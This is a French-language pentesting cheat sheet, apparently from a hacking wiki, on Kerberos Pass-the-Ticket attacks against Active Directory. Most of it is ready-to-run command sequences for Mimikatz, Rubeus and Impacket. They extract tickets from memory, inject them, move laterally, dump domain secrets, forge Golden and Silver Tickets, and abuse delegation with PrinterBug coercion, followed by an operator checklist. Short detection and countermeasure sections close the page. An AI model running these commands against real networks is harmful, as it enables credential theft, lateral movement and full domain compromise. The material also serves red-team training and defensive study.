# Pass-the-Ticket

Le Pass-the-Ticket (PtT) est une technique d'attaque Kerberos qui consiste à voler ou forger des tickets Kerberos (TGT ou TGS) pour s'authentifier sur des services sans connaître le mot de passe en clair du compte. Contrairement au Pass-the-Hash qui exploite NTLM, le Pass-the-Ticket exploite directement le protocole Kerberos.

## Mécanisme
```
[Attaquant] ──→ Vol / Forge du ticket ──→ [Mémoire / Fichier]
[Attaquant] ──→ Injection du ticket ───→ [Session Kerberos]
[Attaquant] ──→ Utilisation du ticket ─→ [Service cible]
[Service]   ──→ Accès accordé ─────────→ [Attaquant]
```

### Différence PtH vs PtT

| Critère | Pass-the-Hash | Pass-the-Ticket |
|---|---|---|
| Protocole | NTLM | Kerberos |
| Matériau | Hash NTLM | Ticket TGT / TGS |
| Détection | Event 4624 Type 3 | Event 4768 / 4769 |
| Durée de validité | Illimitée | 10h (TGT) / variable (TGS) |
| Discrétion | Moyen | Plus discret |

### Types de tickets

| Ticket | Description | Usage |
|---|---|---|
| TGT | Ticket Granting Ticket | Demander des TGS |
| TGS | Ticket Granting Service | Accéder à un service |
| Silver Ticket | TGS forgé avec hash service | Accès direct à un service |
| Golden Ticket | TGT forgé avec hash krbtgt | Accès complet au domaine |

## Prérequis

| Élément | Détail |
|---|---|
| Accès requis | Admin local ou SYSTEM pour extraire les tickets |
| Matériau | Ticket .ccache (Linux) ou .kirbi (Windows) |
| Position réseau | Accès au DC et aux services cibles |
| Outils nécessaires | Mimikatz / Rubeus / Impacket |

## Quick Attack

::: code-group
```bash [Impacket — Linux]
export KRB5CCNAME=/path/to/ticket.ccache
impacket-psexec domain.com/user@<target> -k -no-pass
```
```bash [Rubeus — Windows]
Rubeus.exe ptt /ticket:<base64_ticket>
klist
```
```bash [Mimikatz — Windows]
kerberos::ptt ticket.kirbi
kerberos::ptt /ticket:C:\path\to\ticket.kirbi
```
```bash [NetExec]
nxc smb <target> -u user -p '' --use-kcache
```

:::

## Workflow
```
1. Identifier les tickets disponibles en mémoire ou sur disque
2. Extraire les tickets (Mimikatz / Rubeus / strings)
3. Convertir le format si nécessaire (.kirbi ↔ .ccache)
4. Injecter le ticket dans la session courante
5. Accéder aux services avec le ticket injecté
6. Effectuer le mouvement latéral
```

## Extraction des Tickets

### Via Mimikatz (Windows)
```bash
# Lister les tickets en mémoire
sekurlsa::tickets

# Exporter tous les tickets
sekurlsa::tickets /export

# Via kerberos module
kerberos::list
kerberos::list /export

# Résultat — fichiers .kirbi créés dans le répertoire courant
# [0;3e7]-2-0-40e10000-Administrator@krbtgt-DOMAIN.COM.kirbi
```

### Via Rubeus (Windows)
```bash
# Lister les tickets
Rubeus.exe triage

# Dumper tous les tickets
Rubeus.exe dump

# Dumper un ticket spécifique par LUID
Rubeus.exe dump /luid:0x3e4 /nowrap

# Dumper les tickets d'un utilisateur
Rubeus.exe dump /user:Administrator /nowrap

# Dumper le TGT uniquement
Rubeus.exe dump /service:krbtgt /nowrap

# Format base64 pour transfert
Rubeus.exe dump /nowrap
```

### Via Impacket (Linux)
```bash
# Demander un TGT avec credentials
impacket-getTGT domain.com/user:password -dc-ip <DC>

# Avec hash NTLM
impacket-getTGT domain.com/user -hashes :NTLMhash -dc-ip <DC>

# Demander un TGS
impacket-getST domain.com/user:password -spn cifs/<target> -dc-ip <DC>

# Impersonation via délégation contrainte
impacket-getST domain.com/svcaccount:password \
  -spn cifs/<target> \
  -impersonate Administrator \
  -dc-ip <DC>
```

### Via strings (Linux — mémoire)
```bash
# Extraire les tickets de la mémoire d'un processus
strings /proc/<pid>/mem | grep -a "krb5"

# Via /proc
cat /proc/<pid>/maps
```

## Conversion de Tickets

Les tickets Windows (.kirbi) et Linux (.ccache) ont des formats différents.

### kirbi → ccache
```bash
# Via Impacket
impacket-ticketConverter ticket.kirbi ticket.ccache

# Via Kekeo (Windows)
kekeo.exe "misc::convert ccache ticket.kirbi"
```

### ccache → kirbi
```bash
# Via Impacket
impacket-ticketConverter ticket.ccache ticket.kirbi

# Via Rubeus (base64 → kirbi)
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<base64>"))
```

### Base64 → fichier
```bash
# Linux
echo "<base64_ticket>" | base64 -d > ticket.ccache

# Windows — PowerShell
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<base64>"))
```

## Injection de Tickets

### Via Mimikatz (Windows)
```bash
# Injecter un ticket .kirbi
kerberos::ptt ticket.kirbi

# Injecter depuis un chemin
kerberos::ptt C:\Temp\ticket.kirbi

# Vérifier l'injection
kerberos::list

# Purger les tickets
kerberos::purge
```

### Via Rubeus (Windows)
```bash
# Injecter depuis un fichier .kirbi
Rubeus.exe ptt /ticket:ticket.kirbi

# Injecter depuis base64
Rubeus.exe ptt /ticket:<base64_ticket>

# Vérifier
klist

# Purger
Rubeus.exe purge
```

### Via Impacket (Linux)
```bash
# Définir le ticket à utiliser
export KRB5CCNAME=/path/to/ticket.ccache

# Vérifier
klist

# Utiliser avec les outils Impacket
impacket-psexec domain.com/user@<target> -k -no-pass
impacket-wmiexec domain.com/user@<target> -k -no-pass
impacket-smbclient domain.com/user@<target> -k -no-pass
impacket-secretsdump domain.com/user@<target> -k -no-pass
```

## Utilisation des Tickets

### Mouvement latéral avec ticket TGT
```bash
# Linux — Impacket
export KRB5CCNAME=Administrator.ccache

impacket-psexec domain.com/Administrator@<target> -k -no-pass
impacket-wmiexec domain.com/Administrator@<target> -k -no-pass
impacket-smbexec domain.com/Administrator@<target> -k -no-pass
impacket-atexec domain.com/Administrator@<target> -k -no-pass "whoami"

# Windows — après injection Mimikatz / Rubeus
dir \\<target>\C$
PsExec.exe \\<target> cmd
```

### Accès aux partages
```bash
# Linux
export KRB5CCNAME=ticket.ccache
impacket-smbclient domain.com/user@<target> -k -no-pass

# Windows
dir \\<target>\share
copy \\<target>\C$\Users\Administrator\Desktop\flag.txt
```

### Dump de secrets avec ticket
```bash
export KRB5CCNAME=ticket.ccache
impacket-secretsdump domain.com/user@<target> -k -no-pass
impacket-secretsdump domain.com/Administrator@<DC> -k -no-pass -just-dc-ntlm
```

### Evil-WinRM avec ticket
```bash
export KRB5CCNAME=ticket.ccache
evil-winrm -i <target> -r domain.com
```

### NetExec avec ticket
```bash
export KRB5CCNAME=ticket.ccache
nxc smb <target> -u user -p '' --use-kcache
nxc smb <target> -u user -p '' --use-kcache -x "whoami"
```

## Overpass-the-Hash

L'Overpass-the-Hash consiste à utiliser un hash NTLM pour obtenir un ticket Kerberos TGT — combinant PtH et PtT.
```bash
# Via Impacket — obtenir un TGT avec le hash
impacket-getTGT domain.com/user -hashes :NTLMhash -dc-ip <DC>
export KRB5CCNAME=user.ccache
impacket-psexec domain.com/user@<target> -k -no-pass

# Via Rubeus (Windows)
Rubeus.exe asktgt /user:user /rc4:NTLMhash /domain:domain.com /dc:<DC> /ptt

# Via Mimikatz (Windows)
sekurlsa::pth /user:user /domain:domain.com /ntlm:NTLMhash /run:cmd.exe
# Puis dans le nouveau processus
dir \\<target>\C$
```

## Attaques Avancées

### Délégation contrainte — S4U2Proxy
```bash
# Impersoner un utilisateur via délégation contrainte
impacket-getST domain.com/svcaccount:password \
  -spn cifs/<target> \
  -impersonate Administrator \
  -dc-ip <DC>

export KRB5CCNAME=Administrator@cifs_target.ccache
impacket-psexec domain.com/Administrator@<target> -k -no-pass
```

### Délégation non contrainte — Capture de TGT
```bash
# Sur la machine avec délégation non contrainte
# Attendre qu'un utilisateur se connecte ou forcer via PrinterBug

# Rubeus — monitorer les nouveaux tickets
Rubeus.exe monitor /interval:5 /nowrap

# Forcer une connexion (PrinterBug)
impacket-printerbug domain.com/user:password@<DC> <machine_with_delegation>

# Injecter le ticket capturé
Rubeus.exe ptt /ticket:<base64_captured_ticket>

# Obtenir un TGT DC — DCSync possible
impacket-secretsdump domain.com/DC$@<DC> -k -no-pass -just-dc-ntlm
```

### Golden Ticket
```bash
# Récupérer le hash krbtgt
impacket-secretsdump domain.com/Administrator:password@<DC> -just-dc-user krbtgt

# Créer le Golden Ticket
impacket-ticketer \
  -nthash <KRBTGT_HASH> \
  -domain-sid <DOMAIN_SID> \
  -domain domain.com \
  Administrator

# Utiliser
export KRB5CCNAME=Administrator.ccache
impacket-psexec domain.com/Administrator@<DC> -k -no-pass

# Via Mimikatz (Windows)
kerberos::golden \
  /user:Administrator \
  /domain:domain.com \
  /sid:<DOMAIN_SID> \
  /krbtgt:<KRBTGT_HASH> \
  /ptt
```

### Silver Ticket
```bash
# Récupérer le hash du compte de service
impacket-secretsdump domain.com/Administrator:password@<target> -just-dc-user svcaccount

# Créer le Silver Ticket
impacket-ticketer \
  -nthash <SERVICE_HASH> \
  -domain-sid <DOMAIN_SID> \
  -domain domain.com \
  -spn cifs/<target> \
  user

# Utiliser
export KRB5CCNAME=user.ccache
impacket-smbclient domain.com/user@<target> -k -no-pass

# Via Mimikatz (Windows)
kerberos::golden \
  /user:user \
  /domain:domain.com \
  /sid:<DOMAIN_SID> \
  /target:<target> \
  /service:cifs \
  /rc4:<SERVICE_HASH> \
  /ptt
```

## Configuration Kerberos Linux
```bash
# /etc/krb5.conf — indispensable pour les outils Impacket
cat > /etc/krb5.conf << EOF
[libdefaults]
    default_realm = DOMAIN.COM
    dns_lookup_realm = false
    dns_lookup_kdc = true
    ticket_lifetime = 24h
    forwardable = true

[realms]
    DOMAIN.COM = {
        kdc = <DC_IP>
        admin_server = <DC_IP>
    }

[domain_realm]
    .domain.com = DOMAIN.COM
    domain.com = DOMAIN.COM
EOF

# Synchroniser l'heure critique pour Kerberos
sudo ntpdate <DC_IP>
sudo timedatectl set-ntp false
```

## Détection & IOC

### Event IDs Windows

| Event ID | Description | Contexte |
|---|---|---|
| 4768 | TGT demandé | Normal suspect si source inhabituelle |
| 4769 | TGS demandé | Normal suspect si chiffrement RC4 |
| 4770 | TGT renouvelé | Utilisation ticket volé |
| 4624 | Logon réussi Type 3 | Connexion réseau avec ticket |
| 4672 | Privilèges spéciaux assignés | Connexion compte privilégié |

### Indicateurs de compromission

- Tickets présentés depuis des IPs inhabituelles
- Tickets avec durée de vie anormale (Golden Ticket = 10 ans)
- Authentification Kerberos avec RC4 pour des comptes sensibles
- TGT présentés directement sans passer par le KDC (Silver Ticket)
- Multiples services accédés rapidement depuis le même ticket

## Contre-mesures

- Activer **Protected Users Security Group** empêche la délégation et force AES
- Désactiver **RC4** forcer AES256 pour Kerberos
- Monitorer les **Event IDs 4768 / 4769** avec chiffrement RC4
- Implémenter **Credential Guard** protège LSASS
- Réduire la durée de vie des tickets TGT
- Surveiller les accès anormaux aux services sensibles
- Effectuer un **double reset du compte krbtgt** pour invalider les Golden Tickets existants
- Auditer les comptes avec délégation (contrainte et non contrainte)

## Points d'attaque

- Tickets en mémoire extractibles sans droits SYSTEM (certains cas)
- Délégation non contrainte activée sur des machines
- Comptes de service avec hash extractible (Silver Ticket)
- Hash krbtgt compromis (Golden Ticket)
- RC4 encore autorisé tickets plus faciles à forger
- Absence de monitoring sur les Event IDs Kerberos
- Durée de vie des tickets trop longue

::: info Tips 

- Le **Silver Ticket** est plus discret que le Golden Ticket — il ne contacte jamais le KDC
- Toujours synchroniser l'heure avec le DC (`ntpdate`) avant d'utiliser les tickets — un décalage de 5 minutes invalide tout
- Le **Golden Ticket** reste valide même après reset du mot de passe admin — seul un double reset du krbtgt l'invalide
- `export KRB5CCNAME=ticket.ccache` est la commande la plus importante — toujours vérifier qu'elle est définie
- Rubeus `/nowrap` génère la base64 sur une seule ligne — plus facile à transférer
- Après injection d'un ticket, toujours vérifier avec `klist` avant d'utiliser les outils
- L'**Overpass-the-Hash** est plus discret que le PtH classique car il génère du trafic Kerberos au lieu de NTLM

:::


::: details Checklist

- Tickets en mémoire extraits (Mimikatz / Rubeus)
- Format converti si nécessaire (.kirbi ↔ .ccache)
- KRB5CCNAME défini (Linux)
- Ticket injecté et vérifié (klist)
- krb5.conf configuré (Linux)
- Heure synchronisée avec le DC
- Accès validé avec le ticket
- Mouvement latéral effectué
- Overpass-the-Hash tenté si hash disponible
- Golden / Silver Ticket tenté si conditions réunies
- IOC documentés

:::

## Tools

- [Impacket](https://github.com/SecureAuthCorp/impacket)
- [Mimikatz](https://github.com/gentilkiwi/mimikatz)
- [Rubeus](https://github.com/GhostPack/Rubeus)
- [NetExec (NXC)](https://github.com/Pennyw0rth/NetExec)
- [Evil-WinRM](https://github.com/Hackplayers/evil-winrm)
- [Kekeo](https://github.com/gentilkiwi/kekeo)


## Ressources

- [HackTricks Pass-the-Ticket](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/pass-the-ticket)
- [The Hacker Recipes PtT](https://www.thehacker.recipes/ad/movement/kerberos/ptt)
- [PayloadsAllTheThings Kerberos](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md)
- [Rubeus GitHub](https://github.com/GhostPack/Rubeus)
- [Impacket GitHub](https://github.com/SecureAuthCorp/impacket)

## Notes
```
# Notes terrain
```



<div class="page-footer">

<span>![Last updated](https://img.shields.io/github/last-commit/Hackthus/The-Hackers-237?label=Last%20updated&style=flat-square&color=gray)</span>

<span>[![Edit this page on GitHub](https://img.shields.io/badge/✏️%20Edit%20this%20page-GitHub-black?style=flat-square&logo=github)](https://github.com/Hackthus/The-Hackers-237/edit/main/docs/ad/pass-the-ticket.md)</span>

</div>